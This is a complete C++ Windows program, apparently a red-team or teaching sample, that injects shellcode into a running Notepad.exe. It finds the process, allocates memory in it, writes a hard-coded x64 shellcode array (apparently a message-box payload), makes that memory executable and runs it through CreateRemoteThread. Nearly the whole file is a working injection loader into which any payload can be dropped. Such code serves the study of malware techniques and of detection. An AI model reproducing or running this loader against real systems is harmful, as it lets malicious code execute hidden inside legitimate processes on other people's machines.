#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>

using namespace std;

HANDLE GetProcessHandleByName(const wchar_t *processName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe))
    {
        do
        {
            if (_wcsicmp(pe.szExeFile, processName) == 0)
            {
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                if (hProcess)
                {
                    wcout << L"[+] Found " << processName << L" (PID: " << pe.th32ProcessID << L") and opened handle." << endl;
                    CloseHandle(hSnapshot);
                    return hProcess;
                }
                else
                {
                    cout << "[-] OpenProcess failed! Error: " << GetLastError() << endl;
                }
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    cout << L"[-] Process " << processName << L" not found!" << endl;
    CloseHandle(hSnapshot);
    return NULL;
}

int main()
{
    const wchar_t *targetProcess = L"Notepad.exe";
    DWORD oldProtect; // to store old memory protection
    DWORD threadID;   // to store thread ID of the remote thread

    // Define shellcode a vector to make it dynamic
    vector<unsigned char> shellcode = {
        0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41,
        0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60,
        0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72,
        0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac,
        0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2,
        0xed, 0x52, 0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x6f,
        0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49,
        0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01,
        0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01,
        0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
        0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
        0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e, 0x41, 0x8b,
        0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58,
        0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
        0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12, 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x3e, 0x48,
        0x8d, 0x8d, 0x1a, 0x01, 0x00, 0x00, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5,
        0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d, 0x95, 0x0e, 0x01, 0x00,
        0x00, 0x3e, 0x4c, 0x8d, 0x85, 0x14, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba,
        0x45, 0x83, 0x56, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2,
        0x56, 0xff, 0xd5, 0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x00, 0x68, 0x65, 0x6c, 0x6c, 0x6f,
        0x00, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00};

    HANDLE processHandle = GetProcessHandleByName(targetProcess); // process handle

    // Allocate memory in the target process
    LPVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Write shellcode into allocated memory
    WriteProcessMemory(processHandle, remoteBuffer, shellcode.data(), shellcode.size(), NULL);

    // Change memory protection to can executable
    VirtualProtectEx(processHandle, remoteBuffer, shellcode.size(), PAGE_EXECUTE_READ, &oldProtect);
    //&oldProtect it restores the old protection was before modification to PAGE_EXECUTE_READ

    // Create a remote thread to execute the shellcode
    HANDLE threadHandle = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, &threadID);

    cout << "[+] Shellcode injected successfully. Remote Thread ID: " << threadID << endl;

    // Clean up handles
    CloseHandle(threadHandle);
    CloseHandle(processHandle);

    return 0;
}